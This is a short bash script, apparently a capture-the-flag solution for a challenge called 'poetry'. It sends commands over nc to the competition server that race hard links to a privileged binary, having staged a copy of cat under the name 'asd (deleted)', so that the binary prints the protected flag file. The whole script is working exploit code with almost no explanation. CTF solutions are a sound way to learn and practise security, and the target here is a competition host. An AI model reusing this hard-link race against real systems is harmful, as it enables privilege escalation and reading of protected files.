#!/bin/bash

# cd /home/user/
# cp /bin/cat 'asd (deleted)'
# while true; do ln /home/poetry/poetry ./asd; ( ./asd /home/poetry/flag & ); rm asd; done

echo -e "cd /home/user/\ncp /bin/cat 'asd (deleted)'\nwhile true; do ln /home/poetry/poetry ./asd; ( ./asd /home/poetry/flag & ); rm asd; done" | nc -w 1 poetry.ctfcompetition.com 1337 | awk '/CTF/{print $0}' | head -n 1
